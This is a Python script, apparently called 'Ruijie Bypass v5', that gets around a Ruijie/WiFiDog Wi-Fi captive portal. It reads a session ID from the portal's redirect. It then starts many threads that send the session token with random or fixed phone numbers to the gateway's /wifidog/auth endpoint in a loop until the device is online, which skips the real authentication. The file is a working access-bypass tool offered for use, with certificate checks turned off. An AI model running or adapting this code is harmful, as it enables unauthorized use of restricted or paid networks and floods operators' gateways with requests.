#!/usr/bin/env python3
"""
Ruijie Bypass v5 - Reliable internet check + both POST & GET
"""
import sys, threading, time, urllib.parse, string, random
import requests, urllib3
urllib3.disable_warnings()

def random_phone():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=random.randint(12, 16)))

def check_online():
    """Use generate_204 for reliable captive portal detection"""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204",
                         timeout=5, allow_redirects=False)
        return r.status_code == 204
    except:
        return False

def main():
    method = "POST"
    if "-g" in sys.argv:
        method = "GET"
    if "--both" in sys.argv:
        method = "BOTH"

    print(f"[Ruijie] Method: {method}")

    while True:
        sess = requests.Session()
        sess.verify = False
        sess.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        })

        try:
            if check_online():
                time.sleep(5)
                continue

            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         timeout=10, allow_redirects=True)
            portal_url = r.url
            parsed = urllib.parse.urlparse(portal_url)
            params = urllib.parse.parse_qs(parsed.query)
            host = f"{parsed.scheme}://{parsed.netloc}"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]

            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
            if not sid: sess.close(); time.sleep(3); continue

            print(f"[SID] {sid[:16]}...  [GW] {gw_addr}:{gw_port}  [{method}]")

            stop = False

            def follow_redirect(r):
                """Follow 302 redirect to complete auth"""
                loc = r.headers.get("Location", "")
                if loc and "success" in loc:
                    try: sess.get(loc, timeout=5)
                    except: pass

            if method in ("POST", "BOTH"):
                def ping_post():
                    while not stop:
                        try:
                            r = sess.post(
                                f"http://{gw_addr}:{gw_port}/wifidog/auth",
                                params={"token": sid, "phoneNumber": random_phone()},
                                headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
                                timeout=3,
                                allow_redirects=False,
                            )
                            follow_redirect(r)
                        except: pass

            if method in ("GET", "BOTH"):
                def ping_get():
                    while not stop:
                        try:
                            r = sess.get(
                                f"http://{gw_addr}:{gw_port}/wifidog/auth",
                                params={"token": sid, "phonenumber": "102762"},
                                timeout=3,
                                allow_redirects=False,
                            )
                            follow_redirect(r)
                        except: pass

            if method in ("POST", "BOTH"):
                for _ in range(10):
                    threading.Thread(target=ping_post, daemon=True).start()
            if method in ("GET", "BOTH"):
                for _ in range(10):
                    threading.Thread(target=ping_get, daemon=True).start()

            online = False
            while not stop:
                time.sleep(2)
                if check_online():
                    if not online:
                        print("*** ONLINE ***")
                        online = True
                else:
                    if online:
                        print("[Lost]")
                        online = False
                        break

            stop = True
            sess.close()

        except KeyboardInterrupt:
            print("\nStopped"); sys.exit(0)
        except Exception as e:
            print(f"[!] {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()
